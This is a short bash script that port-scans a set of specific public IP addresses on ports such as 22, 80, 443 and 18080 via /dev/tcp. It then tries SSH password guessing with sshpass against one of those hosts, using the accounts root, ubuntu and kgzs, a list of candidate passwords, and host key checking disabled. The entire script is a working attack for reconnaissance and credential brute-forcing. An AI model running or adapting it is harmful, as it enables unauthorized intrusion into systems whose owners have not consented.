#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ) runner=$(hostname)"
echo "### PUBSCAN"
for ip in 123.184.7.129 123.184.7.130 123.184.7.131 123.184.7.132 123.184.7.133 123.184.7.134 123.184.7.135 123.184.7.136 123.184.7.179; do
  for p in 22 18000 14998 9400 80 443 18080; do
    ( timeout 3 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "OPEN $ip:$p" ) &
  done
done
wait
echo "### SSH-PW-LADDER .135"
for u in root ubuntu kgzs; do
  for p in 'Admin@123_para#!2024' 'Beijingcs.2024' 'Bingxing.2026' 'Kgzs@2024' 'ubuntu@'; do
    R=$(timeout 14 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=7 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@123.184.7.135 'id -un; hostname' 2>&1 | tr '\n' ' ' | cut -c1-160)
    echo "SSH $u|$p => $R"
    case "$R" in *root*|*ubuntu*|*kgzs*) echo "HIT $u|$p"; break 2;; esac
    sleep 1
  done
done
echo "### END $(date -u +%FT%TZ)"
